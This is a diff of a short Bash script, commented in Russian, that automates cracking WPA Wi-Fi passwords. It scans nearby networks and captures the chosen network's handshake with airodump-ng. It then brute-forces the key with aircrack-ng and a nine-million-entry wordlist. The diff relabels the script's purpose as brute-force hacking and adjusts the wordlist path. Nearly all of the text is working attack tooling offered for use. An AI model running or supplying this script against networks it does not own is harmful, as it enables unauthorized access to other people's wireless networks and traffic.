@@ -1,5 +1,5 @@
 #!/bin/bash
-# Скрипт сканирования и выбора Wi-Fi сети
+# Скрипт сканирования и выбора Wi-Fi сети для взлома брутом, автор kirikra
 
 # Функция для сканирования Wi-Fi сетей
 scan_networks() {
@@ -14,7 +14,7 @@ scan_networks() {
 
 # Функция для выбора Wi-Fi сети
 select_network() {
-    read -p "Выберите номер сети для записи (из представленных выше): " network
+    read -p "Выбери номер сети для записи (из представленных выше): " network
     BSSID=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $1}')
     CHANNEL=$(cat scan_results-01.csv | grep "WPA" | awk -F, 'NR=='$network' {print $4}')
     airodump-ng --bssid $BSSID -c $CHANNEL wlan1
@@ -28,7 +28,7 @@ select_network() {
     then
     echo "Приступаю ко взлому через 3 секунды"
     sleep 3
-    aircrack-ng -w /9mil.txt -b $BSSID file-01.cap
+    aircrack-ng -w lists/9mil.txt -b $BSSID file-01.cap
     else
     echo "КАП файл под названием file-01.cap сохранен, проверьте другие файлы для анализа в случае неообходимости"
     fi
